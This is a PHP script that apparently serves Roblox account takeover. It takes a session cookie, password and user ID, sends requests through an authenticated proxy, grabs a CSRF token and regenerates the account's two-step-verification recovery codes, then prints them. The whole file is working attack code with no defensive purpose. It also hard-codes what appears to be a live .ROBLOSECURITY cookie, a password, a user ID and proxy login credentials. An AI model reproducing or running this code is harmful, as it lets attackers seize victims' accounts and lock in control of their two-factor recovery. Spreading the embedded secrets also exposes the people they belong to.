<?php
 function recoveryCodes($verified,$cookie, $password, $userid, $fullproxy){
    if($verified == "Unverified"){
    echo "Unverified";
    }else{
        $proxy = explode(':', $fullproxy);
        $proxy_ip = $proxy[0];
        $proxy_port = $proxy[1];
        $user = $proxy[2];
        $pass = $proxy[3];
        $ch = curl_init();
        
        curl_setopt($ch, CURLOPT_URL, 'https://auth.roblox.com/v2/login');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_PROXYPORT, $proxy_port);
        curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
        curl_setopt($ch, CURLOPT_PROXY, $proxy_ip);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user . ':' . $pass);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '{
            "cvalue":"Leakeder",
            "ctype":"Username",
            "password":"RAMAD001",
        }'
        );
        
        $headers = array();
        $headers[] = 'Content-Type: application/json';
        $headers[] = 'Accept: application/json';
         $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
        $headers[] =    'Referer: https://www.roblox.com/login';
         $headers[] =    'Cookie: .ROBLOSECURITY='.$cookie;
           $headers[] = 'Origin: https://www.roblox.com';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $result = curl_exec($ch);
        $headers = [];
        $result = rtrim($result);
        $data = explode("\n",$result);
        $headers['status'] = $data[0];
        array_shift($data);
        
        foreach($data as $part){
        
            //some headers will contain ":" character (Location for example), and the part after ":" will be lost, Thanks to @Emanuele
            $middle = explode(":",$part,2);
        
            //Supress warning message if $middle[1] does not exist, Thanks to @crayons
            if ( !isset($middle[1]) ) { $middle[1] = null; }
        $headers[trim($middle[0])] = trim($middle[1]);
        }
        
        $csrf= $headers["x-csrf-token"];
    $fields_string='{
        "password": "'.$password.'"
      }';
    $ch2= curl_init();
    
    curl_setopt($ch2, CURLOPT_URL, 'https://twostepverification.roblox.com/v1/users/'.$userid.'/recovery-codes/regenerate');
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch2, CURLOPT_PROXYPORT, $proxy_port);
    curl_setopt($ch2, CURLOPT_PROXYTYPE, 'HTTP');
    curl_setopt($ch2, CURLOPT_PROXY, $proxy_ip);
    curl_setopt($ch2, CURLOPT_PROXYUSERPWD, $user . ':' . $pass);
    curl_setopt($ch2, CURLOPT_POST, 1);
    curl_setopt($ch2, CURLOPT_HEADER, 1);
    curl_setopt($ch2, CURLOPT_POSTFIELDS, $fields_string);
    
    
    $headers = array();
    $headers[] = 'Content-Type: application/json';
    $headers[] = 'Accept: application/json';
     $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
    $headers[] =    'Referer: https://www.roblox.com/';
       $headers[] = 'Origin: https://www.roblox.com';
       $headers[]= 'Cookie: .ROBLOSECURITY='.$cookie;
       $headers[] =    'x-csrf-token:'.$csrf;
    curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);
    $header_size = curl_getinfo($ch2, CURLINFO_HEADER_SIZE);
    $output1 = curl_exec($ch2);
    $pos = strpos($output1, '{"recoveryCodes":');
        $outputs = substr($output1, $pos);
    $pos = strpos($output1, '{"errors":[');
        $outputerr = substr($output1, $pos);
        if($outputerr == '{"errors":[{"code":6,"message":"The account pin is locked.","userFacingMessage":"Something went wrong"}]}'){
            return "Error when try generate Recovery Codes because account have PIN";
        }elseif($outputerr == '{"errors":[{"code":5,"message":"Too many requests.","userFacingMessage":"Something went wrong"}]}'){
    return 'Too many requests';
    }elseif($outputerr !== '{"errors":[{"code":6,"message":"The account pin is locked.","userFacingMessage":"Something went wrong"}]}'){
    $json = json_decode($outputs, true);
    $shit1 = $json["recoveryCodes"]["0"];
    $shit2 = $json["recoveryCodes"]["1"];
    $shit3 = $json["recoveryCodes"]["2"];
    $shit4 = $json["recoveryCodes"]["3"];
    $shit5 = $json["recoveryCodes"]["4"];
    $shit6 = $json["recoveryCodes"]["5"];
    $shit7 = $json["recoveryCodes"]["6"];
    return "$shit1, $shit2, $shit3, $shit4, $shit5, $shit6, $shit7";
    }else{
        return "Failure";
    }
    }
    }   
    $recoveryCodes = recoveryCodes("Verified", "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CC076A7384F8B98FAAFBF7A06E3B118AC91D6150532462AD6EDD305AAD7452686D68EAFAAD46D11A5C6A1D760DAB8450E991CD86574AB602B90D75A1C41294164C87038F18C414B107BDFCE47DAF96E4485B718FFCB559167B1E9017E00447BC390B0AC828F8279253FF94A92E80D8509F278EBD65D0522F21925BCE7ED9074C5A3917AF59151E337A026F2D6F6A0E0FE24ADE315738BB16F0E70E0CEC7DCD0DE55CF6007AB6D2B924F72CCDE302374EB4A1AE7D8798B08832A2EE6152D5768177ED50844616604DB4D4B404A16AFACBEC77FAA4F1029FB8A5B6B0E46E50172ACA99480F0D70D08143F29D9F47E9E8036C5FA9B1E353B13AA9A6E0E1B903C539443138FA35AF323B70C96961E333375511D16AF2A44264364F1C13B6DCE6810ADEA18E0E6DD406E6CA5892DD5EF0FB52A4164C7513050BE31F9FAE559638DDFC256A1032277A15202D0302812BC7AF63D629C30D446BE4343555D6FE468E7486B2324FDC64D84423D7689200ABC65A15BB142B21C06D801C1E4BCCBD412A51013CA86EC7", "asodjowiajsodijwa232", "3598626218", "45.85.160.103:7195:akaneizumi:kazuontop");
echo $recoveryCodes;
?>